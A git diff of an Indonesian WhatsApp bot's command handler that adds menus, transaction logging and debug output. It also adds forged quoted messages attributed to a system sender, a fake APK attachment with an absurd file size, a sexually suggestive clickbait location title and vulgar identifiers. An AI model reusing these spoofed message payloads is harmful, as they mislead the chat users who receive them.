@@ -7,11 +7,10 @@ process.on('unhandledRejection', console.error)
  */
 require('./settings');
 require('./setown');
+const config = require('./config.js');
 const events = require('events');
-
 // Set batas listener menjadi lebih tinggi, misalnya 20
 events.EventEmitter.defaultMaxListeners = 100000;
-
 // Atau set secara spesifik untuk `process`
 process.setMaxListeners(100000);
 const sharp = require('sharp');
@@ -28,6 +27,7 @@ const chalk = require('chalk');
 const { youtube } = require("btch-downloader")
 const yts = require('yt-search');
 const ytdl = require('ytdl-core');
+
 const cron = require('node-cron');
 const cheerio = require('cheerio');
 const fetch = require('node-fetch');
@@ -39,6 +39,8 @@ const {
 const google = require('googlethis');
 const similarity = require('similarity');
 const PDFDocument = require('pdfkit');
+const JsConfuser = require('js-confuser'); 
+const JavaScriptObfuscator = require('javascript-obfuscator'); // Obfuscation JS
 const webp = require('node-webpmux');
 const ffmpeg = require('fluent-ffmpeg');
 const speed = require('performance-now');
@@ -58,10 +60,24 @@ const {
 	execSync
 } = require('child_process');
 const {
+  Presence, 
+  MessageOptions,
+  Mimetype,
+  WALocationMessage,
+  WA_MESSAGE_STUB_TYPES,
+  ReconnectMode,
+  ProxyAgent,
+  GroupSettingChange,
+  ChatModification,
+  waChatKey,
+  mentionedJid
+} = require('@adiwajshing/baileys')
+const {
 	BufferJSON,
 	WA_DEFAULT_EPHEMERAL,
 	generateWAMessageFromContent,
 	proto,
+	downloadMediaMessage,
 	getBinaryNodeChildren,
 	generateWAMessageContent,
 	MessageType,
@@ -104,6 +120,13 @@ const {
 	setUang,
 	transfer
 } = require('./lib/game');
+
+const {
+    imageUploader,
+    generateRandomText,
+    toRupiah
+} = require('./lib/functions.js');
+
 const {
 	pinterest,
 	pinterest2,
@@ -169,6 +192,8 @@ const {
 // Read Database
 const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
 const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
+
+
 // Database Game
 let suit = db.game.suit = []
 let menfes = db.game.menfes = []
@@ -199,6 +224,19 @@ let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
 // Variabel global untuk menyimpan prompt default
 let llamaPrompt = "ngobrol singkat dengan bahasa indonesia tidak baku dan kamu adalah SychyyBotz";
 let userPrompt = "kalo jawab pake bahasa indonesia ga baku aja dan kamu adalah SychyyBotz"; // Default prompt
+
+let apkFile = {
+    document: fs.readFileSync("src/media/fake.apk"), // Pastikan path benar
+    fileName: " RKA STORE",
+    mimetype: "application/vnd.android.package-archive", // MIME type untuk APK
+    fileLength: "99999999999999999", // Ukuran file dalam byte (opsional)
+    pageCount: "999" // Tidak terlalu berpengaruh untuk APK
+};
+
+// Kirim pesan dengan file APK
+
+
+
     
     // Fungsi untuk mengompres audio menggunakan ffmpeg
 async function compressAudio(audioUrl) {
@@ -225,6 +263,7 @@ async function compressAudio(audioUrl) {
         resolve(compressedAudio);
     });
 }
+
     
 // Fungsi Menambahkan Command
 const addCmd = (id, command) => {
@@ -251,6 +290,7 @@ const getCommandPosition = (id) => {
 
 
 
+
         const cmdGrup = ["linkgroup","ephemeral","setppgc","setname","setdesc","group","editinfo","add","kick","hidetag","tagall","totag","antilink","mute","promote","demote"]
         const cmdDown = ["tiktoknowm","tiktokwm","tiktokmp3","instagram","twitter","twittermp3","facebook","pinterestdl","ytmp3","ytmp4","getmusic","getvideo","joox","soundcloud"]
         const cmdSearch = ["play","yts","google","gimage","pinterest","wallpaper","wikimedia","ytsearch","ringtone","stalk","playstore","gsmarena","jadwalbioskop","nowplayingbioskop","aminio","wattpad","webtoons","drakor","iqra","hadist","alquran","tafsirsurah"]
@@ -262,6 +302,35 @@ const getCommandPosition = (id) => {
         const cmdMain = ["ping","owner","menu","delete","infochat","quoted","listpc","listgc","listonline","speedtest","setcmd","listcmd","delcmd","lockcmd","addmsg","listmsg","getmsg","delmsg","anonymous","start","next","keluar"]
         const cmdOwner = ["react","chat","join","leave","block","unblock","bcgroup","bcall","setppbot","setexif","anticall","setstatus","setnamebot"]
         const allCmd = [...cmdGrup, ...cmdDown, ...cmdSearch, ...cmdRand, ...cmdMaker, ...cmdFun, ...cmdPrimbon, ...cmdConv, ...cmdMain, ...cmdOwner]
+        
+        
+
+// Fungsi untuk menambahkan transaksi
+function addTransaction(name, amount) {
+    try {
+        const transactionId = name || "Pengguna"; // ID transaksi menggunakan nama pengguna
+        const transactions = JSON.parse(fs.readFileSync('./database/transaksi.json', 'utf8')) || [];  // Pastikan file kosong jika belum ada data
+
+        const newTransaction = {
+            id: transactionId, // Menggunakan nama pengguna sebagai ID transaksi
+            name: name,
+            amount: amount,
+            status: 'pending', // Status awal adalah pending
+            time: new Date().toISOString(), // Waktu transaksi
+        };
+
+        transactions.push(newTransaction);
+
+        // Menyimpan transaksi baru ke file
+        fs.writeFileSync('./database/transaksi.json', JSON.stringify(transactions, null, 2), 'utf8');
+        return newTransaction; // Mengembalikan transaksi baru
+    } catch (error) {
+        console.error("Gagal menambahkan transaksi:", error);
+        return null; // Jika gagal, return null
+    }
+}
+
+
 
 // Fungsi Mendapatkan Command Berdasarkan Hash
 const getCmd = (id) => {
@@ -287,12 +356,15 @@ const checkSCommand = (id) => {
 	});
 	return status;
 };
+
 // Fungsi Format Monospace
 function monospace(string) {
 	return '```' + string + '```';
 }
 
-// 1. Fungsi untuk membaca semua nama case dari file
+
+
+// Fungsi untuk membaca semua nama case dari file
 const getAllCases = () => {
     const fileContent = fs.readFileSync("./naze.js", "utf-8");
     const caseRegex = /case\s*['"`](.*?)['"`]\s*:/g;
@@ -301,22 +373,39 @@ const getAllCases = () => {
     while ((match = caseRegex.exec(fileContent)) !== null) {
         cases.push(match[1]);
     }
+    console.log("Daftar case yang ditemukan:", cases); // Debugging
     return cases;
 };
 
-// 2. Deteksi typo dengan didYouMean
+// Fungsi untuk mendeteksi typo dan memberikan saran
 const detectTypoCommand = (input) => {
     const validCommands = getAllCases(); // Ambil semua nama case
+    console.log("Input pengguna:", input); // Debugging
+    console.log("Daftar case yang valid:", validCommands); // Debugging
+
     const suggestedCommand = didYouMean(input, validCommands);
+    console.log("Saran dari didYouMean:", suggestedCommand); // Debugging
+
     if (suggestedCommand) {
-        return suggestedCommand;
+        return `Apakah maksud kamu \`${suggestedCommand}\`?`;
     }
     return null;
 };
+
+// Contoh penggunaan
+const inputPengguna = "helo"; // Ganti dengan input yang sebenarnya
+const suggestion = detectTypoCommand(inputPengguna);
+
+if (suggestion) {
+    console.log(suggestion); // Output: "Apakah maksud kamu `hello`?"
+} else {
+    console.log("Perintah tidak dikenali.");
+}
 module.exports = sych = async (sych, m, chatUpdate, store) => {
 	try {
 		await LoadDataBase(sych, m);
 		const content = JSON.stringify(m.message);
+		
 		const type = m.message ? Object.keys(m.message)[0] : null;
 		let _chats = type === "conversation" && m.message.conversation ? m.message.conversation : type == "imageMessage" && m.message.imageMessage.caption ? m.message.imageMessage.caption : type == "videoMessage" && m.message.videoMessage.caption ? m.message.videoMessage.caption : type == "extendedTextMessage" && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : type == "buttonsResponseMessage" && m.message[type].selectedButtonId ? m.message[type].selectedButtonId : type == "stickerMessage" && getCmd(m.message[type].fileSha256.toString("base64")) !== null && getCmd(m.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(m.message[type].fileSha256.toString("base64")) : "";
 		const cmd = (type === 'conversation') ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (type === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : (type == 'stickerMessage') && (getCmd(m.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(m.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(m.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
@@ -334,7 +423,11 @@ const getUserName = (userId) => {
     const user = daftar.find(user => user.id === userId);
     return user ? user.name : null;
 };
-		
+		// Dekode vote dari PollUpdateMessage
+const decodeVote = (vote) => {
+    return Buffer.from(vote.encPayload).toString('utf8'); // Sesuaikan dengan library WA
+};
+
 		
 		const isCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 		const prefix = /^[°zZ#@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : ''
@@ -344,8 +437,10 @@ const getUserName = (userId) => {
 		const args = body.trim().split(/ +/).slice(1)
 		const quoted = m.quoted ? m.quoted : m
 		const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
-		
-    
+		  const query = body.trim().split(/ +/).slice(1).join(' ');
+    const params = query.split('|').map(param => param.trim());
+     const _0x4d375b = fs.readFileSync("./src/media/sychy.png");
+       
 		const text = args.join(' ')
 		const q = args.join(' ')
 		const mime = (quoted.msg || quoted).mimetype || ''
@@ -367,6 +462,39 @@ const getUserName = (userId) => {
 		const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
 		const isQuotedSticker = type === "extendedTextMessage" && content.includes("stickerMessage");
 		const extendedText = MessageType;
+		const Styles = (text, style = 1) => {
+  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
+  var yStr = {
+    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
+  };
+  var replacer = [];
+  xStr.map((v, i) =>
+    replacer.push({
+      original: v,
+      convert: yStr[style].split('')[i]
+    })
+  );
+  var str = text.toLowerCase().split('');
+  var output = [];
+  str.map((v) => {
+    const find = replacer.find((x) => x.original == v);
+    find ? output.push(find.convert) : output.push(v);
+  });
+  return output.join('');
+};
+
+const pushname = m.pushName || "No Name"
+
+    
+function getFormattedDate() {
+  var currentDate = new Date();
+  var day = currentDate.getDate();
+  var month = currentDate.getMonth() + 1;
+  var year = currentDate.getFullYear();
+  var hours = currentDate.getHours();
+  var minutes = currentDate.getMinutes();
+  var seconds = currentDate.getSeconds();
+}
 		// Fake
 		sych.deleteMessage = async (chatId, key) => {
 			try {
@@ -433,6 +561,47 @@ const downloadMp3 = async (url) => {
     }
 }
 
+// Cetak seluruh objek 'm' untuk melihat struktur lengkap
+console.log("Objek m:", m);
+
+// Cetak properti 'message' dari 'm'
+console.log("m.message:", m.message);
+
+// Periksa apakah 'interactiveMessage' ada di dalam 'message'
+console.log("m.message.interactiveMessage:", m.message?.interactiveMessage);
+
+// Periksa 'nativeFlowMessage' di dalam 'interactiveMessage'
+console.log("m.message.interactiveMessage?.nativeFlowMessage:", m.message?.interactiveMessage?.nativeFlowMessage);
+
+// Periksa apakah 'buttons' tersedia di dalam 'nativeFlowMessage'
+console.log("m.message.interactiveMessage?.nativeFlowMessage?.buttons:", m.message?.interactiveMessage?.nativeFlowMessage?.buttons);
+
+// Jika 'buttons' adalah array, cetak jumlah tombol yang ada
+if (Array.isArray(m.message?.interactiveMessage?.nativeFlowMessage?.buttons)) {
+    console.log("Jumlah buttons:", m.message.interactiveMessage.nativeFlowMessage.buttons.length);
+} else {
+    console.log("buttons tidak tersedia atau bukan array");
+}
+
+// Cetak properti 'messageParams' di dalam 'nativeFlowMessage'
+console.log("m.message.interactiveMessage?.nativeFlowMessage?.messageParams:", m.message?.interactiveMessage?.nativeFlowMessage?.messageParams);
+
+// Periksa apakah 'Json' ada di dalam 'messageParams'
+console.log("m.message.interactiveMessage?.nativeFlowMessage?.messageParams?.Json:", m.message?.interactiveMessage?.nativeFlowMessage?.messageParams?.Json);
+
+// Jika 'Json' adalah objek, cetak isi lengkapnya
+if (typeof m.message?.interactiveMessage?.nativeFlowMessage?.messageParams?.Json === "object") {
+    console.log("Isi Json:", m.message.interactiveMessage.nativeFlowMessage.messageParams.Json);
+} else {
+    console.log("Json tidak tersedia atau bukan objek");
+}
+
+// Tambahan untuk mengecek apakah ada properti lain yang mungkin terlewat
+console.log("Properti lain di m.message.interactiveMessage:", Object.keys(m.message?.interactiveMessage || {}));
+console.log("Properti lain di m.message.interactiveMessage?.nativeFlowMessage:", Object.keys(m.message?.interactiveMessage?.nativeFlowMessage || {}));
+
+
+
 		const floc = {
       key: { participant: "0@s.whatsapp.net" },
       message: { locationMessage: { name: `${prefix + command}`, jpegThumbnail: fake.thumbnail } },
@@ -489,7 +658,7 @@ const mess = {
 };
 
 
-		const fkontak = {
+        const memek = {
 			key: {
 				remoteJid: 'status@broadcast',
 				participant: '0@s.whatsapp.net',
@@ -498,11 +667,28 @@ const mess = {
 			 },
        "message": {
                     "locationMessage": {
-                    "name": '🔥 Termux Never Die',
+                    "name": 'Video 1 G4k ku4t d1 hut4n d1 g45',
                     "jpegThumbnail": ''
                           }
                         }
                       }
+
+		const fkontak = {
+			key: {
+				participant: '0@s.whatsapp.net'
+			},
+			message: {
+				orderMessage: {
+					itemCount: 99999,
+					status: 1,
+					surface: 1,
+					message: `${ucapanWaktu}, Bpk/ Ibu ${m.pushName ? m.pushName : 'Tanpa Nama'} `,
+					orderTitle: `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
+					thumbnail: fake.texz, //Gambarnye
+					sellerJid: '0@s.whatsapp.net'
+				}
+			}
+		}
 		const ftroli2 = {
 			key: {
 				participant: '0@s.whatsapp.net'
@@ -520,8 +706,771 @@ const mess = {
 			}
 		}
 		
+		const fmemek = {
+			key: {
+				remoteJid: 'status@broadcast',
+				participant: '0@s.whatsapp.net',
+				fromMe: false,
+				id: `${botname}`
+			 },
+       "message": {
+                    "locationMessage": {
+                    "name": 'Indonesia\nPalembang, 23 Januari 2025',
+                    "jpegThumbnail": ''
+                          }
+                        }
+                      }
+                      
+
+
+async function downloadProductImage(msg, sock) {
+    if (!msg.product.productImage) {
+        console.log("Tidak ada gambar produk.");
+        return;
+    }
+
+    try {
+        // Pastikan ini adalah objek, bukan array
+        const mediaMessage = msg.product.productImage;
+        
+        console.log("Coba download media:", JSON.stringify(mediaMessage, null, 2));
+
+        let media = await downloadMediaMessage(
+            mediaMessage,  // Langsung gunakan objeknya
+            'buffer',
+            {},
+            { reuploadRequest: sock.updateMediaMessage }
+        );
+
+        console.log("Gambar berhasil diunduh!");
+        return media;  // Buffer gambar
+    } catch (err) {
+        console.error("Gagal mendownload gambar:", err);
+    }
+}
+
 	
-		
+		//kontol
+		async function runKontolCase(m, sych, sycreply, isRegistered) {
+  console.log("Debug - Memulai eksekusi runPpkCase");
+// Emoji yang akan digunakan
+const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
+
+// Mengirimkan reaksi secara berurutan
+for (const emoji of reactEmojis) {
+    await sych.sendMessage(m.chat, {
+        react: {
+            text: emoji,
+            key: m.key
+        }
+    });
+}
+  try {
+    // Pengecekan status pendaftaran
+    if (!isRegistered) {
+      console.log("Debug - Pengguna belum terdaftar.");
+      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+    }
+    
+let profile;
+				try {
+					profile = await sych.profilePictureUrl(m.sender, 'image');
+				} catch (e) {
+					profile = fake.anonim;
+				}
+
+    let menu = `*_👋🏻 *Hello! I am Langz Bot Version 9999.*  
+Ready products like nokos, and many more! Designed with precision and care, I ensure your experience is seamless and efficient.  
+
+╭───❐ *I N F O R M A S I* ❐───✧  
+├ 📜 *Bot Name* : Langz 
+├ 👨‍💻 *Owner* : Galang  
+├ 🌐 *Version* : 9999  
+├ 🛒 *Product* : Nokos  
+╰─────────────────────✧  
+
+💡 *Feel free to explore all my features using the menu provided!*  
+🔰 Powered by Galangz _*`;
+
+    // Tombol utama
+let buttons = [
+    { buttonId: ".bot mode self", buttonText: { displayText: " Self " }, type: 1 },
+    { buttonId: ".bot mode public", buttonText: { displayText: " Public " }, type: 1 },
+    
+    // Tambahkan tombol cta_url di sini
+        {
+        buttonId: 'action',
+        buttonText: { displayText: 'This Button List' },
+        type: 4,
+        nativeFlowInfo: {
+            name: 'single_select',
+            paramsJson: JSON.stringify({
+                title: "Select Menu!",
+                sections: [
+                    {
+                        title: "Silahkan Pilih Button Menu di Bawah Ini",
+                        highlight_label: "Powered by Galangz",
+                        rows: [
+                            { title: " All Menu", description: " Semua Menu", id: ".allmenuu" },
+                            { title: " Owner", description: " Info Owner", id: ".pepek" },
+                            { title: " Produk", description: " Produk Info", id: ".produk" },
+                            { title: " Donasi", description: " Donasi Dong", id: ".donasi" },
+                            { title: " Group Menu", description: " Menu Group", id: ".grupmenu" },
+                            { title: " Setting Bot", description: " Pengaturan Bot", id: ".bot byy" }
+                        ]
+                    }
+                ]
+            })
+        },
+        viewOnce: true
+    },
+   
+    
+];
+
+    // Pesan dengan media video
+    let buttonMessage = {
+    document: fake.docs,
+        fileName: ucapanWaktu,
+        mimetype: pickRandom(fake.listfakedocs),
+        fileLength: '100000000000000',
+        pageCount: '999',
+        image: {
+            url: "./src/media/sych.png", // Pastikan file ini tersedia
+            gifPlayback: true
+        },
+        caption: `${menu}`, // Teks menu
+        contextInfo: {
+            forwardingScore: 999,
+            isForwarded: true,
+            externalAdReply: {
+                title: "Bot Status",
+                body: "🟢 Active",
+                thumbnailUrl: profile,
+                mediaType: 1,
+                renderLargerThumbnail: true,
+                previewType: 0,
+             
+                mediaUrl: my.gh,
+                sourceUrl: my.gh
+            }
+        },
+        footer: "© Langz",
+        buttons: buttons,
+        viewOnce: true,
+        headerType: 4
+    };
+
+    // Tambahan flow actions
+    const flowActions = [
+    {
+        buttonId: 'action',
+        buttonText: { displayText: 'This Button List' },
+        type: 4,
+        nativeFlowInfo: {
+            name: 'single_select',
+            paramsJson: JSON.stringify({
+                title: "Select Menu!",
+                sections: [
+                    {
+                        title: "Silahkan Pilih Button Menu di Bawah Ini",
+                        highlight_label: "Powered by Galangz",
+                        rows: [
+                            { title: " All Menu", description: " Semua Menu", id: ".allmenuu" },
+                            { title: " Owner", description: " Info Owner", id: ".pepek" },
+                            { title: " Produk", description: " Produk Info", id: ".produk" },
+                            { title: " Donasi", description: " Donasi Dong", id: ".donasi" },
+                            { title: " Group Menu", description: " Menu Group", id: ".grupmenu" },
+                            { title: " Setting Bot", description: " Pengaturan Bot", id: ".bot byy" }
+                        ]
+                    }
+                ]
+            })
+        },
+        viewOnce: true
+    },
+   
+    
+];
+
+
+    // Tambahkan flowActions ke buttonMessage
+    buttonMessage.buttons.push(...flowActions);
+
+    // Kirim pesan
+    await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
+    console.log("Debug - Pesan carousel berhasil dikirim.");
+
+  } catch (error) {
+    console.error("Debug - Kesalahan saat mengirim carousel:", error);
+    await sych.sendMessage(m.chat, {
+      text: "Terjadi kesalahan saat mengirim pesan carousel. Silakan hubungi AI untuk memeriksa log kesalahan."
+    }, {
+      quoted: m
+    });
+  }
+}
+			//UJICOBS
+				async function sendInteractiveForm(sych, jid) {
+    try {
+        const message = {
+            key: {
+                remoteJid: jid, // ID penerima
+                fromMe: true,
+                id: generateUniqueId(), // Fungsi untuk membuat ID unik
+            },
+            messageTimestamp: Math.floor(Date.now() / 1000), // Timestamp Unix
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "Fill up the form and I will get right in touch with you ☺️\n\nℹ️ The more accurate your answers are, the faster & better I can help you.",
+                    },
+                    nativeFlowMessage: {
+                        buttons: [
+                            {
+                                name: "galaxy_message",
+                                buttonParamsJson: JSON.stringify({
+                                    mode: "published",
+                                    flow_message_version: "3",
+                                    flow_token: "1:1307913409923914:750445b6ec7dce6db2a09bde2d6154e6",
+                                    flow_id: "1307913409923914",
+                                    flow_cta: "Talk to us",
+                                    flow_action: "navigate",
+                                    flow_action_payload: {
+                                        screen: "QUESTION_ONE",
+                                    },
+                                    flow_metadata: {
+                                        flow_json_version: 201,
+                                        flow_name: "Lead Qualification [en]",
+                                    },
+                                }),
+                            },
+                            {
+                                name: "submit_form",
+                                buttonParamsJson: JSON.stringify({
+                                    mode: "published",
+                                    flow_message_version: "1",
+                                    flow_cta: "Submit Form",
+                                    flow_action: "submit",
+                                    flow_action_payload: {
+                                        form_data: {
+                                            name: "Your Name",
+                                            email: "your.email@example.com",
+                                        },
+                                    },
+                                }),
+                            },
+                        ],
+                    },
+                },
+            },
+        };
+
+        // Kirim pesan menggunakan `sych`
+        await sych.sendMessage(m.key.remoteJid, message);
+        console.log("Pesan interaktif berhasil dikirim!");
+    } catch (error) {
+        console.error("Gagal mengirim pesan interaktif:", error);
+    }
+}
+						
+
+//ppk
+
+async function runPpkCase(m, sych, sycreply, isRegistered) {
+  console.log("Debug - Memulai eksekusi runPpkCase");
+// Emoji yang akan digunakan
+const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
+
+// Mengirimkan reaksi secara berurutan
+for (const emoji of reactEmojis) {
+    await sych.sendMessage(m.chat, {
+        react: {
+            text: emoji,
+            key: m.key
+        }
+    });
+}
+  try {
+    // Pengecekan status pendaftaran
+    if (!isRegistered) {
+      console.log("Debug - Pengguna belum terdaftar.");
+      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+    }
+
+    // Mengecek apakah file gambar ada
+    const imagePath = './src/media/sychy.png';
+    const fs = require('fs');
+    if (!fs.existsSync(imagePath)) {
+      console.error("Debug - File gambar tidak ditemukan di path:", imagePath);
+      return sycreply('Gagal mengirim pesan karena file gambar tidak ditemukan.');
+    } else {
+      console.log("Debug - File gambar ditemukan:", imagePath);
+    }
+
+    // Membuat konten carousel
+    const carouselCards = [
+      {
+        header: {
+          title: "> Owner",
+          hasMediaAttachment: true,
+          imageMessage: (await generateWAMessageContent({
+            image: {
+              url: imagePath
+            }
+          }, {
+            upload: sych.waUploadToServer
+          })).imageMessage
+        },
+        body: {
+          text: `> Hubungi Owner`
+        },
+        footer: {
+          text: ""
+        },
+        nativeFlowMessage: {
+          buttons: [
+            {
+              name: "cta_url",
+              buttonParamsJson: JSON.stringify({
+                display_text: "Whatsapp",
+                url: "https://wa.me/+17089003182"
+              })
+            },
+            {
+              name: "cta_call",
+              buttonParamsJson: JSON.stringify({
+                display_text: "Call",
+                phone_number: "+6288274119688"
+              })
+            }
+          ]
+        }
+      }
+    ];
+
+    console.log("Debug - Carousel cards dibuat:", carouselCards);
+
+    // Membuat pesan carousel
+    const carouselMessage = generateWAMessageFromContent(m.chat, {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2
+          },
+          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+            body: {
+              text: "> Owner akan merespon secepat mungkin!!"
+            },
+            footer: {
+              text: "©Langz"
+            },
+            header: {
+              hasMediaAttachment: false
+            },
+            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+              cards: carouselCards
+            })
+          })
+        }
+      }
+    }, {});
+
+    console.log("Debug - Carousel message telah dibuat:", carouselMessage);
+
+    // Kirim pesan carousel
+    await sych.relayMessage(m.chat, carouselMessage.message, {
+      messageId: carouselMessage.key.id
+    });
+    console.log("Debug - Pesan carousel berhasil dikirim.");
+
+  } catch (error) {
+    console.error("Debug - Kesalahan saat mengirim carousel:", error);
+    await sych.sendMessage(m.chat, {
+      text: "Terjadi kesalahan saat mengirim pesan carousel. Silakan hubungi AI untuk memeriksa log kesalahan."
+    }, {
+      quoted: m
+    });
+  }
+}
+
+async function runAllMenuCase(m, sych, sycreply, isRegistered) {
+  console.log("Debug - Memulai eksekusi runPpkCase");
+
+ 
+
+// Emoji yang akan digunakan
+const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
+
+// Mengirimkan reaksi secara berurutan
+for (const emoji of reactEmojis) {
+    await sych.sendMessage(m.chat, {
+        react: {
+            text: emoji,
+            key: m.key
+        }
+    });
+}
+				sycreply('Menampilkan All Menu...')
+				let profile;
+				try {
+					profile = await sych.profilePictureUrl(m.sender, 'image');
+				} catch (e) {
+					profile = fake.anonim;
+				}
+				const menunya = `
+■ 「 *${n}USER INFO${n}* 」
+${f}*Nama* : ${m.pushName ? m.pushName : 'Tanpa Nama'}
+${f}*Id* : @${m.sender.split('@')[0]}
+${f}*User* : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
+${f}*Limit* : ${isVip ? 'VIP' : db.users[m.sender].limit }
+${f}*Uang* : ${db.users[m.sender] ? db.users[m.sender].uang.toLocaleString('id-ID') : '0'}
+
+■ 「 *${n}BOT INFO${n}* 」
+${f}*Nama Bot* : ${botname}
+${f}*Powered* : @${'0@s.whatsapp.net'.split('@')[0]}
+${f}*Owner* : @${owner[0].split('@')[0]}
+${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
+
+■ 「 *${n}ABOUT${n}* 」
+${f}*Tanggal* : ${tanggal}
+${f}*Hari* : ${hari}
+${f}*Jam* : ${jam} WIB
+‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
+╭──❍「 *${n}BOT${n}* 」❍
+│${setv} ${prefix}profile
+│${setv} ${prefix}claim
